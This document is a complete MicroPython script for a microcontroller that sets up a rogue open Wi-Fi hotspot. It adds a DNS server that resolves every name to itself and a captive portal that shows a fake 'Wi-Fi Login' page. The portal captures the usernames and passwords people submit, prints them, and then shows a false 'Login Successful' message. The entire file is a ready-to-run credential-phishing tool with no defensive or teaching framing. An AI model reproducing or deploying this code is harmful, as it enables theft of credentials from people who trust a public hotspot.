import network
import socket
import ure
import uasyncio as asyncio

# --- Open Wi-Fi Access Point ---
ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid='Hello world', authmode=network.AUTH_OPEN)

print("Starting open access point...")
while not ap.active():
    pass

ip = ap.ifconfig()[0]
print("Access point active")
print("SSID:", ap.config('essid'))
print("IP:", ip)


# --- Fake DNS Server ---
class DNSServer:
    def __init__(self, ip):
        self.ip = ip
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('0.0.0.0', 53))
        self.sock.setblocking(False)

    async def run(self):
        print("DNS server started...")
        while True:
            try:
                data, addr = self.sock.recvfrom(512)
            except OSError:
                await asyncio.sleep_ms(10)
                continue

            txid = data[0:2]
            flags = b'\x81\x80'
            qdcount = b'\x00\x01'
            ancount = b'\x00\x01'
            nscount = b'\x00\x00'
            arcount = b'\x00\x00'
            dns_header = txid + flags + qdcount + ancount + nscount + arcount
            dns_question = data[12:]
            resp_rr = b'\xc0\x0c' + b'\x00\x01' + b'\x00\x01' + \
                      b'\x00\x00\x01\x2c' + b'\x00\x04' + bytes(map(int, self.ip.split('.')))
            response = dns_header + dns_question + resp_rr
            self.sock.sendto(response, addr)


# --- HTTP Server ---
class HTTPServer:
    def __init__(self, ip):
        self.ip = ip
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(('0.0.0.0', 80))
        self.sock.listen(5)
        self.sock.setblocking(False)

    async def handle_client(self, cl, addr):
        print('Client connected from', addr)
        try:
            request = b""
            while True:
                part = cl.recv(1024)
                if not part:
                    break
                request += part
                if len(part) < 1024:
                    break
            request = request.decode()
        except Exception as e:
            print("Request read error:", e)
            cl.close()
            return

        print("HTTP request received:", request)
        first_line = request.split('\n')[0]
        print("Request line:", first_line)
        match_path = ure.search(r'GET\s+([^\s]+)', first_line)
        path = '/'
        if match_path:
            path = match_path.group(1).split('?')[0]

        # Handle form submission
        if path.startswith('/submit'):
            match_user = ure.search(r'user=([^&]+)', request)
            match_pass = ure.search(r'pass=([^&]+)', request)
            username = match_user.group(1) if match_user else ''
            password = match_pass.group(1) if match_pass else ''
            print("Credentials received → User:", username, "Password:", password)

            response = "HTTP/1.1 302 Found\r\nLocation: /success.html\r\nConnection: close\r\n\r\n"
            cl.send(response.encode())
            cl.close()
            return

        # Success page
        if path == '/success.html':
            response = """\
HTTP/1.1 200 OK
Content-Type: text/html
Connection: close

<!DOCTYPE html>
<html>
<head><title>Login Successful</title></head>
<body>
    <h1>Login Successful</h1>
    <p>You can now access the Internet.</p>
</body>
</html>
"""
            cl.send(response.encode())
            cl.close()
            return

        # Login page
        if path == '/login':
            response = """\
HTTP/1.1 200 OK
Content-Type: text/html
Connection: close

<!DOCTYPE html>
<html>
<head><title>Wi-Fi Login</title></head>
<body>
    <h1>Login Required</h1>
    <p>Please log in to access the Internet:</p>
    <form action="/submit" method="get">
        <label>Username:</label><br>
        <input type="text" name="user"><br><br>
        <label>Password:</label><br>
        <input type="password" name="pass"><br><br>
        <input type="submit" value="Log In">
    </form>
</body>
</html>
"""
            cl.send(response.encode())
            cl.close()
            return

        # Redirect any unknown path to /login
        response = "HTTP/1.1 302 Found\r\nLocation: /login\r\nConnection: close\r\n\r\n"
        cl.send(response.encode())
        cl.close()

    async def run(self):
        print('HTTP server started at http://{}/'.format(self.ip))
        while True:
            try:
                cl, addr = self.sock.accept()
            except OSError:
                await asyncio.sleep_ms(10)
                continue
            await self.handle_client(cl, addr)


# --- Main ---
async def main():
    dns = DNSServer(ip)
    http = HTTPServer(ip)
    await asyncio.gather(dns.run(), http.run())

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("Shutdown requested.")

